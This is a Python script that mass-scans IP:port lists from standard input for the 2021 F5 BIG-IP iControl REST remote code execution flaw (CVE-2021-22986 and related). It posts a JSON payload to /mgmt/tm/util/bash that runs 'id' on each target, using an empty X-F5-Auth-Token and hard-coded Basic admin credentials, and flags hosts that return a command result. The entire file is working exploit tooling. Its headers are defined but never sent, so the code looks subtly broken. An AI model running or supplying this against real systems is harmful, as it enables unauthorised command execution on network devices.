#!/usr/bin/env python3

# Take IP/ports (x.x.x.x:y) on std in and try to ascertain if they are vulnerable to March 2021 F5 RCE
# Reference: https://github.com/h4x0r-dz/RCE-Exploit-in-BIG-IP/blob/main/f5_rce.py
# CVE-2021-22986, CVE-2021-22987, CVE-2021-22988, CVE-2021-22989 and CVE-2021-22990

import sys
import requests
import threading
import concurrent.futures
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Global vars for headers and payload
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': '',
        'Authorization': 'Basic YWRtaW46QVNhc1M='
    }
payload = json.dumps({'command': 'run' , 'utilCmdArgs': '-c id'})
def checkIPPort(url):
    try:
        response = requests.post(url + '/mgmt/tm/util/bash', data=payload, timeout=10, verify = False)
        if response:
            if response.status_code == 200 and 'commandResult' in response.text:
                print ("[***]POTENTIALLY VULNERABLE[***] - " + url)
    except Exception:
        pass

urls = []
for line in sys.stdin:
    urls.append("http://" + line.rstrip())
    urls.append("https://" + line.rstrip())

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(checkIPPort, urls)
